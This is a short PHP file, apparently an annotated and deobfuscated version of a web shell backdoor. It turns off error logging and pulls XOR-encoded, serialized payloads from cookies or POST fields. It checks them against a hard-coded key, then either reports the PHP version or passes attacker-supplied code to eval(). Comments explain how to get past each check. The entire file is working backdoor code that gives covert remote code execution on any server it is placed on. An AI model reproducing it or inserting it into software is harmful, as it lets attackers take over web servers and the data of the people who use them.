<?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@set_time_limit(0);

// Constant value
function get_key() {
    return base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH");
}

// XOR strings while trimming to the shortest string's length
function xor_strings($left, $right) {
    return $left ^ $right;
}

// XOR strings while repeating $right to fit $left's length.
// Example: if $left = "Epitech" and $right = "ha", the result will be
// equivalent to "Epitech" ^ "hahahah"
function xor_strings_repeating($left, $right) {
    $result = "";

    for ($i = 0; $i < strlen($left);) {
        for ($j = 0; $j < strlen($right) && $i < strlen($left); $j++, $i++) {
            $result .= $left[$i] ^ $right[$j];
        }
    }

    return $result;
}

// Essentially, if key is "4ef63abe-1abd-45a6-913d-6fb99657e24b", value will
// be left unchanged.
function decode_with_key($value, $key) {
    return xor_strings_repeating(
        xor_strings_repeating(
            $value,
            // xor_strings(get_key(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe')
            // is a constant value:
            "4ef63abe-1abd-45a6-913d-6fb99657e24b"
        ),
        $key
    );
}

// Call decode_with_key($value, $key) and unserialize the result.
function decode_and_unserialize($value, $key) {
    return @unserialize(decode_with_key($value, $key));
}

$payload = false;

foreach ($_COOKIE as $key => $value) {
    $payload = decode_and_unserialize(base64_decode($value), $key);

    if ($payload)
        break;
}

if (!$payload) {
    foreach ($_POST as $key => $value) {
        $payload = decode_and_unserialize(base64_decode($value), $key);

        if ($payload)
            break;
    }
}

// $payload['ak'] should be a true-ish value to avoid entering this
if (
    !isset($payload['ak'])
    || !xor_strings(
        get_key(),
        'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'
    ) == $payload['ak']
) {
    $payload = array();
} else {
    // $payload['a'] should be "e"
    switch ($payload['a']) {
        case "i":
            $array = array();
            $array['pv'] = @phpversion();
            $array['sv'] = '1.0-1';
            echo @serialize($array);
            break;
        case "e":
            // $payload['d'] should contain the code to be evaluated
            eval($payload['d']);
            break;
    }
}
